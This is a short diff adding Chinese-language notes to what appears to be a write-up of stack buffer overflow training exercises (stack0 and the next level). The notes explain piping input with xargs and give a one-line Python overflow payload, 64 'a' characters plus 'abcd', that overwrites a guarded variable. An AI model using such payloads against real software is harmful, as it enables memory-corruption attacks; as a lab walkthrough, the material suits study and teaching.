@@ -52,3 +52,13 @@ if\(modified == 0x61626364\) {
 
 ![](/png/08.png)
 
+比较简单，命令行用python实现
+
+![](/png/09.png)
+
+需要注意这个是要直接带参数，没有换行输入，所以管道后面要加xargs 
+
+上题中输入执行程序的名称后换行要输入buffer，所以直接就是python -c "print 'a'\*64 + ‘abcd'" \| ./stack0
+
+
+
